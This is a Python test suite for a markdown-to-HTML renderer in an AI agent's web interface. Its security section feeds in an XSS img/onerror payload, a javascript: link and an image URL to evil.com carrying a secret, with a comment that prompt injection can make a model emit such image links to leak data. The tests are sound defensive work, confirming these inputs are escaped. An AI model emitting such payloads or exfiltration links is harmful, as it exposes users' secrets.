"""web/markdown.js 的渲染测试：用 node 跑前端文件，在 Python 里断言输出。

前端零构建、不引入 npm，所以测试也不装任何 JS 包；机器上没有 node 就整体跳过。
"""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest

import simpleagent.web

NODE = shutil.which("node")
SCRIPT = Path(simpleagent.web.__file__).parent / "markdown.js"

pytestmark = pytest.mark.skipif(NODE is None, reason="需要 node 来跑前端 JS")


def md(src: str) -> str:
    js = (
        f"const {{ renderMarkdown }} = require({json.dumps(str(SCRIPT))});"
        "const src = JSON.parse(require('fs').readFileSync(0, 'utf8'));"
        "process.stdout.write(JSON.stringify(renderMarkdown(src)));"
    )
    out = subprocess.run(
        [NODE, "-e", js],
        input=json.dumps(src),
        capture_output=True,
        text=True,
        check=True,
        timeout=10,
    )
    return json.loads(out.stdout)


# --------------------------------------------------------------- 块级
def test_heading_and_paragraphs():
    # 段落里的单个换行是 <br>，空行分段
    assert md("## 标题\n第一行\n第二行\n\n第二段") == (
        "<h2>标题</h2><p>第一行<br>第二行</p><p>第二段</p>"
    )


def test_nested_list_is_tight():
    assert md("- a\n  - b\n    - c\n- d") == (
        "<ul><li>a<ul><li>b<ul><li>c</li></ul></li></ul></li><li>d</li></ul>"
    )


def test_loose_list_wraps_paragraphs():
    assert md("- a\n\n- b") == "<ul><li><p>a</p></li><li><p>b</p></li></ul>"


def test_ordered_list_start_and_code_inside_item():
    assert md("3. x\n4. y") == '<ol start="3"><li>x</li><li>y</li></ol>'
    assert md("1. 安装\n   ```bash\n   uv sync\n   ```\n2. 运行") == (
        '<ol><li>安装<pre class="code"><code>uv sync</code></pre></li><li>运行</li></ol>'
    )


def test_list_interrupts_paragraph():
    # 模型常写「步骤：」紧跟列表、中间不空行
    assert md("步骤：\n1. a\n2. b") == "<p>步骤：</p><ol><li>a</li><li>b</li></ol>"


def test_task_list():
    html = md("- [x] 完成\n- [ ] 待办")
    assert html.count('class="task-box"') == 2
    assert html.count("checked") == 1


def test_table_alignment_and_cells():
    html = md("| 名称 | 数量 |\n|:--|--:|\n| `a | b` | 2 |\n| c |")
    assert '<th style="text-align:left">名称</th>' in html
    assert '<td style="text-align:right">2</td>' in html
    assert "<code>a | b</code>" in html  # 行内代码里的 | 不拆列
    assert html.count("<td") == 4  # 缺的单元格按表头补齐


def test_table_needs_matching_separator():
    # 分隔行列数对不上就不是表格
    assert "<table>" not in md("a | b\n| --- |")


def test_blockquote_and_hr():
    assert md("> 引用\n>> 嵌套") == (
        "<blockquote><p>引用</p><blockquote><p>嵌套</p></blockquote></blockquote>"
    )
    assert md("a\n\n---\n\nb") == "<p>a</p><hr><p>b</p>"
    assert md("* * *") == "<hr>"


def test_fenced_code_escapes_and_unclosed_runs_to_end():
    assert md('```py\nx = "<b>"\n```') == (
        '<pre class="code"><code>x = &quot;&lt;b&gt;&quot;</code></pre>'
    )
    # 流式输出时围栏还没闭合：直接按代码块渲染到末尾，不先显示成普通文本
    assert md("```\nfoo **bar**\n") == '<pre class="code"><code>foo **bar**</code></pre>'


# --------------------------------------------------------------- 行内
def test_emphasis():
    assert md("**粗** *斜* _斜_ ~~删~~ ***都***") == (
        "<p><strong>粗</strong> <em>斜</em> <em>斜</em> <del>删</del> "
        "<strong><em>都</em></strong></p>"
    )


def test_no_false_emphasis():
    html = md("__init__.py 和 2 * 3 * 4 和 snake_case_name")
    assert "<em>" not in html and "<strong>" not in html


def test_code_span_and_backslash_escape_are_literal():
    assert md("`**x**` 和 ``a`b`` 和 \\*不斜\\*") == (
        "<p><code>**x**</code> 和 <code>a`b</code> 和 *不斜*</p>"
    )


def test_links():
    html = md("[文档](https://example.com/a_b?x=1&y=2)")
    assert html == (
        '<p><a href="https://example.com/a_b?x=1&amp;y=2" target="_blank" '
        'rel="noopener noreferrer">文档</a></p>'
    )
    # 链接文字里可以有行内代码
    assert "<code>code</code> 链接</a>" in md("[`code` 链接](https://a.com)")


def test_bare_url_trims_trailing_punctuation():
    html = md("见 https://example.com/x。(https://en.wikipedia.org/wiki/Foo_(bar))")
    assert 'href="https://example.com/x"' in html
    assert 'href="https://en.wikipedia.org/wiki/Foo_(bar)"' in html
    assert "</a>)</p>" in html  # 多出来的右括号留在链接外面


# --------------------------------------------------------------- 安全
def test_raw_html_is_escaped_everywhere():
    payload = "<img src=x onerror=alert(1)>"
    for src in [
        payload,
        f"# {payload}",
        f"- {payload}",
        f"> {payload}",
        f"| a |\n|---|\n| {payload} |",
        f"[{payload}](https://a.com)",
    ]:
        html = md(src)
        assert "<img" not in html, src
        assert "&lt;img" in html, src


def test_only_http_links_are_clickable():
    html = md("[x](javascript:alert(1)) [y](./src/foo.py)")
    assert "<a" not in html and "href" not in html
    assert '<span class="link-off" title="javascript:alert(1)">x</span>' in html


def test_images_are_never_loaded():
    # prompt injection 可以让模型输出带机密参数的图片地址，渲染即外发
    html = md("![logo](https://evil.com/?q=secret)")
    assert "<img" not in html
    assert ">图片：logo</a>" in html


def test_only_br_tag_is_allowed():
    assert md("a<br>b<br/>c") == "<p>a<br>b<br>c</p>"
    assert md("<br onclick=x>") == "<p>&lt;br onclick=x&gt;</p>"
